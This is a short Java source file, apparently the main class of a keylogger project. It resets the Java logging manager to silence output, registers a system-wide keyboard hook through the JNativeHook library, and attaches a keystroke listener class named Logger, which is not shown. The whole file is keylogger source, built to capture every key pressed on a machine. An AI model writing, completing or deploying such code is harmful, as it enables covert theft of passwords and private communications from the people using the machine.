package pl;

import org.jnativehook.GlobalScreen;
import pl.keylogger.Logger;

import java.util.logging.LogManager;

public class Main {
    public static void main(String[] args) {
        try {
            LogManager.getLogManager().reset();
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new Logger());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
